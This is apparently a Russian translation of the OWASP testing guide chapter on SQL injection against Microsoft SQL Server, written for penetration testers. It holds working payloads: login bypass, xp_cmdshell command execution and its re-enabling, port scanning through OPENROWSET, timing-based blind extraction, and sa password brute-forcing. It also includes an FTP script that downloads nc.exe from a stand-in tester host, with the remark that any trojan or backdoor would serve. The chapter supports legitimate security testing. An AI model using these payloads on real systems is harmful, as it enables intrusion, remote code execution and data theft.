# SQL Server

## Резюме

В этом разделе рассматриваются техники [внедрения SQL-кода (SQL Injection)](https://owasp.org/www-community/attacks/SQL_Injection), использующие специфические возможности Microsoft SQL Server.

Уязвимости внедрения SQL-кода возникают всякий раз, когда пользовательский ввод используется при построении SQL-запроса без достаточных ограничений или санитизации. Использование динамического SQL (построение SQL-запросов путем конкатенации строк) открывает возможность для данных уязвимостей. SQL-инъекция позволяет злоумышленнику получить доступ к SQL-серверам и выполнять SQL-код с привилегиями учетной записи, используемой для подключения к базе данных.

Как пояснялось в главе [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection), для эксплуатации SQL-инъекции требуются две вещи: точка входа и эксплойт для внедрения. Любой контролируемый пользователем параметр, обрабатываемый приложением, может содержать уязвимость. Сюда входят:

- Параметры приложения в строках запроса (например, в GET-запросах)
- Параметры приложения, передаваемые в теле POST-запроса
- Данные, относящиеся к браузеру (например, User-Agent, Referer)
- Сведения о хосте (например, имя хоста, IP-адрес)
- Данные сессии (например, идентификатор пользователя `[User ID]`, файлы cookie)

Microsoft SQL Server имеет ряд уникальных характеристик, поэтому некоторые эксплойты требуют специальной адаптации под данную СУБД.

## Методика тестирования

### Особенности SQL Server

Для начала рассмотрим некоторые операторы, команды и хранимые процедуры SQL Server, полезные при тестировании на SQL-инъекции:

- оператор комментария: `--` (полезен для игнорирования оставшейся части исходного запроса; требуется не во всех случаях)
- разделитель запросов: `;` (точка с запятой)
- Полезные хранимые процедуры и возможности включают:
    - [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql): выполняет командную оболочку на сервере в контексте сервисной учетной записи SQL Server. Требует привилегий `sysadmin` и по умолчанию отключена, начиная с SQL Server 2005 (может быть повторно включена с помощью `sp_configure` при включении отображения расширенных параметров `[advanced options]`).
    - `xp_regread`: считывает произвольное значение из реестра (недокументированная расширенная процедура)
    - `xp_regwrite`: записывает произвольное значение в реестр (недокументированная расширенная процедура)
    - [sp_makewebtask](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) (удалена; присутствует только в очень старых версиях SQL Server): записывала результаты запроса в файл через Web Assistant.
    - [xp_sendmail](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) (удалена вместе с SQL Mail): отправляла электронные письма, которые могли содержать вложения с результирующим набором данных запроса.

Приведенные ниже примеры ориентированы на техники, сохраняющие актуальность для SQL Server и Azure SQL Managed Instance при наличии доступа к привилегированным функциям. Большинство из них использует оператор `exec`.

Ниже показано, как выполнить команду оболочки, записывающую вывод команды `dir c:\inetpub` в доступный через браузер файл, при условии, что веб-сервер и сервер БД размещены на одном хосте. Следующий синтаксис использует `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

В устаревших версиях SQL Server, где все еще доступны процедуры Web Assistant, вместо нее можно было использовать `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Успешное выполнение создаст файл, который тестировщик сможет просмотреть через браузер.

Кроме того, весьма удобны встроенные функции и системные переменные SQL Server. В следующем примере используется функция `db_name()` для вызова ошибки, возвращающей имя базы данных:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Обратите внимание на использование функции [convert](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` попытается преобразовать результат работы `db_name` (строку) в целочисленную переменную, вызвав ошибку преобразования типов, которая при отображении уязвимым приложением будет содержать имя базы данных.

В следующем примере используется системная переменная `@@version` в сочетании с инъекцией в стиле `union select` для определения версии SQL Server:

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

А вот аналогичная атака, но с использованием трюка с конвертацией:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

Сбор информации полезен для последующей эксплуатации уязвимостей программного обеспечения на стороне SQL Server посредством атаки SQL Injection или прямого доступа к сетевому листенеру SQL.

Ниже приведено несколько примеров эксплуатации уязвимостей SQL-инъекций через различные точки входа.

### Пример 1: SQL-инъекция в GET-запросе

Самым простым (и зачастую наиболее результативным) случаем является форма входа, запрашивающая имя пользователя и пароль для аутентификации. Можно попробовать ввести следующую строку: "' or '1'='1" (без двойных кавычек):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Если приложение использует динамические SQL-запросы и строка добавляется в запрос проверки учетных данных пользователя, это может привести к успешному входу в приложение.

### Пример 2: SQL-инъекция в GET-запросе

Для определения количества столбцов:

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Пример 3: тестирование в POST-запросе

SQL Injection, тело HTTP POST-запроса: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Полный пример POST-запроса (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

Сообщение об ошибке, полученное при вводе символа `'` (одинарная кавычка) в поле email:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Пример 4: еще один (полезный) пример с GET-запросом

Получение исходного кода приложения:

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Пример 5: включение или замена `xp_cmdshell`

Стандарты безопасности предписывают держать `xp_cmdshell` отключенной. Имея права `sysadmin` (изначально или после восстановления пароля `sa` или администратора; см. ниже), включите ее повторно или воссоздайте аналогичную функциональность.

Включение `xp_cmdshell` через инъекцию:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

В устаревших средах SQL Server 2000, если процедура `xp_cmdshell` была удалена с помощью `sp_dropextendedproc`, ее можно было восстановить командой:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

Если это завершалось сбоем из-за перемещения или удаления `xp_log70.dll`, то пользовательская процедура на базе OLE Automation (`sp_OACreate`, `sp_OAMethod`, `sp_OADestroy`) могла воссоздать возможность выполнения команд оболочки, как описано Антонином Фоллером (Antonin Foller, см. ссылки внизу страницы), при условии, что OLE Automation оставалась включенной.

### Пример 6: заголовки Referer / User-Agent

Заголовок `REFERER`, установленный в значение:

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

позволяет выполнить произвольный SQL-код. То же самое происходит при передаче в заголовке User-Agent:

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Пример 7: SQL Server в роли сканера портов

В SQL Server одной из наиболее полезных (по крайней мере, для пентестера) команд является OPENROWSET, предназначенная для выполнения запроса на удаленном сервере БД и извлечения результатов. Тестировщик на проникновение может использовать эту команду для сканирования портов других узлов в целевой сети, внедрив следующий запрос:

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Этот запрос попытается установить соединение с адресом x.y.w.z на порт p. Если порт закрыт, возвращается следующее сообщение:

`SQL Server does not exist or access denied`

Если же порт открыт, возвращается одна из следующих ошибок:

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Разумеется, сообщение об ошибке доступно не всегда. В таком случае для понимания происходящего можно использовать время ответа: при закрытом порте будет исчерпан таймаут (5 секунд в этом примере), тогда как при открытом порте ответ вернется незамедлительно.

Имейте в виду, что `OPENROWSET` и специальные распределенные запросы (Ad Hoc Distributed Queries) отключены по умолчанию, начиная с SQL Server 2005 (в SQL Server 2000 они были включены по умолчанию).

### Пример 8: загрузка исполняемых файлов

Получив возможность использовать `xp_cmdshell` (штатную или кастомную), мы можем легко загрузить исполняемые файлы на целевой сервер БД. Очень распространенным выбором является `netcat.exe`, однако подойдет любой троян или бэкдор. Если целевой системе разрешено инициировать исходящие FTP-соединения к машине тестировщика, достаточно внедрить следующие запросы:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

На этом этапе файл `nc.exe` будет загружен и доступен для запуска.

Если протокол FTP заблокирован межсетевым экраном, существует обходной путь с использованием встроенного отладчика Windows `debug.exe`, установленного по умолчанию во всех системах Windows. `Debug.exe` поддерживает скрипты и способен собрать исполняемый файл из соответствующего файла сценария. Для этого необходимо преобразовать исполняемый файл в отладочный скрипт (представляющий собой на 100% ASCII-файл), построчно загрузить его на сервер и выполнить с помощью `debug.exe`. Существует несколько инструментов для создания таких отладочных файлов (например, `makescr.exe` от Ollie Whitehouse и `dbgtool.exe` от `toolcrypt.org`). Внедряемые запросы примут следующий вид:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

На этом этапе исполняемый файл оказывается на целевой машине и готов к выполнению. Существуют утилиты, автоматизирующие этот процесс, среди которых наиболее известны `Bobcat` (работающая под Windows) и `Sqlninja` (работающая под Unix) (см. раздел инструментов в конце страницы).

### Получение информации при отсутствии вывода (внеполосный канал)

Не все потеряно, когда веб-приложение не возвращает никакой информации — например, информативных сообщений об ошибках (см. главу [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Например, у специалиста может быть доступ к исходному коду (в частности, если веб-приложение основано на ПО с открытым исходным кодом). В таком случае пентестер может эксплуатировать все уязвимости SQL-инъекций, обнаруженные в ходе автономного анализа приложения. Хотя IPS может заблокировать некоторые из этих атак, оптимальным подходом будет следующий: разработать и протестировать векторы атак на специально созданном тестовом стенде, а затем применить их против проверяемого веб-приложения.

Другие варианты проведения внеполосных атак описаны в [Примере 4 выше](#пример-4-еще-один-полезный-пример-с-get-запросом).

### Атаки со слепой SQL-инъекцией

#### Метод проб и ошибок

В качестве альтернативы можно действовать методом проб и ошибок. Атакующий может предположить наличие уязвимости слепой или внеполосной SQL-инъекции в веб-приложении. Затем он выбирает вектор атаки (например, точку веб-ввода), [применяет векторы фаззинга](../../06.%20Appendix/D.%20Fuzzing.md) к этому каналу и анализирует отклик. Например, если веб-приложение ищет книгу с помощью запроса:

```sql
select * from books where title="text entered by the user"
```

тестировщик на проникновение может ввести строку: `'Bomba' OR 1=1-`, и если данные не валидируются должным образом, запрос выполнится и вернет полный список книг. Это служит доказательством наличия уязвимости SQL Injection. Впоследствии тестировщик может экспериментировать с запросами для оценки критичности уязвимости.

> **_ПРИМЕЧАНИЕ:_**  Будьте осторожны при внедрении условия OR 1=1 в SQL-запрос. Хотя это может быть безвредным в исходном контексте инъекции, приложения часто используют данные из одного запроса в нескольких различных операциях к БД. Если ваше условие попадет, например, в инструкцию UPDATE или DELETE, это может привести к случайной потере данных.

#### При отображении нескольких сообщений об ошибках

С другой стороны, если предварительная информация отсутствует, сохраняется возможность проведения атаки путем эксплуатации скрытого канала (covert channel). Может случиться так, что подробные сообщения об ошибках подавляются, но сами ошибки тем не менее несут определенные сведения. Например:

- В некоторых случаях веб-приложение (фактически веб-сервер) может возвращать стандартную ошибку `500: Internal Server Error`, например, когда приложение генерирует исключение, вызванное запросом с незакрытыми кавычками.
- В других случаях сервер возвращает код `200 OK`, однако веб-приложение выводит сообщение об ошибке, заложенное разработчиками: `Internal server error` или `bad data`.

Даже одного бита информации может оказаться достаточно, чтобы понять структуру динамического SQL-запроса, формируемого веб-приложением, и настроить полезную нагрузку. Другим внеполосным методом является вывод результатов в доступные через HTTP файлы.

#### Атаки по времени (Timing Attacks)

Существует еще одна возможность реализации слепой SQL-инъекции при отсутствии видимого отклика от приложения: измерение времени, которое требуется веб-приложению для ответа на запрос. Подобная атака [описана Крейгом Энли (Chris Anley)](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf), откуда взяты следующие примеры. Стандартный подход использует команду `waitfor delay`: если атакующий хочет проверить, существует ли тестовая база данных `pubs`, он внедряет следующую команду:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

По времени ответа на запрос можно узнать результат проверки. Фактически здесь используются две вещи: уязвимость SQL-инъекции и скрытый канал (covert channel), позволяющий тестировщику извлекать по 1 биту информации за каждый запрос. Таким образом, с помощью серии запросов (число которых равно количеству бит в извлекаемых данных) пентестер может получить любые данные из базы. Взгляните на следующий запрос:

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Измеряя время ответа и варьируя значения `@i`, можно вычислить длину имени текущей базы данных, а затем приступить к извлечению самого имени с помощью запроса:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Этот запрос вызовет задержку в 5 секунд, если бит `@bit` байта `@byte` имени текущей базы данных равен 1, и вернет ответ мгновенно, если он равен 0. Организовав два вложенных цикла (для `@byte` и `@bit`), можно извлечь фрагмент данных целиком.

Однако может оказаться, что команда `waitfor` недоступна (например, блокируется IPS или WAF). Это не означает невозможность проведения атак Blind SQL Injection: пентестеру достаточно подобрать любую ресурсоемкую операцию, которая не фильтруется. Например:

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Проверка версии и известных уязвимостей

Аналогичный подход с замером времени можно использовать для определения версии SQL Server через встроенную переменную `@@version`:

`select @@version`

Примеры ответов:

`Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) ...`

`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...`

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

Поскольку год выпуска продукта и номер сборки располагаются со смещением в разных версиях, извлекайте характерную подстроку (например, `2022`, `2019` или номер мажорной версии, такой как `16.0`), а не завязывайтесь на конкретную позицию символа. Проверка на основе времени может выглядеть так:

`if (select @@version) like '%2022%' waitfor delay '0:0:5'`

### Пример 9: перебор пароля системного администратора (sysadmin)

Для подбора пароля учетной записи sysadmin можно воспользоваться тем, что `OPENROWSET` требует корректных учетных данных для успешного подключения, и такое подключение может быть закольцовано на локальный сервер БД. Объединяя эти возможности с логической инъекцией на основе задержек времени, можно внедрить следующий код:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Здесь выполняется попытка подключения к локальной базе данных (обозначенной пустым полем после `SQLOLEDB`) с учетными данными `sa` и `<pwd>`. Если пароль верен и подключение успешно, запрос выполняется, вызывая задержку сервера на 5 секунд (а также возвращая значение, так как OPENROWSET ожидает как минимум один столбец). Перебирая пароли-кандидаты по словарю и измеряя время каждого подключения, можно подобрать правильный пароль. В работе "Data-mining with SQL Injection and Inference" Дэвид Литчфилд (David Litchfield) развивает эту технику дальше, внедряя код для подбора пароля sysadmin с использованием вычислительных ресурсов самого сервера БД.

Получив пароль sysadmin, у нас есть два варианта действий:

- Внедрять все последующие запросы через `OPENROWSET`, используя привилегии sysadmin
- Добавить текущего пользователя в группу sysadmin с помощью процедуры `sp_addsrvrolemember`. Имя текущего пользователя можно извлечь методом логической инъекции через переменную `system_user`.

Помните, что специальные распределенные запросы (Ad Hoc Distributed Queries) и `OPENROWSET` ограничены, начиная с SQL Server 2005, и обычно должны быть явно включены администратором.
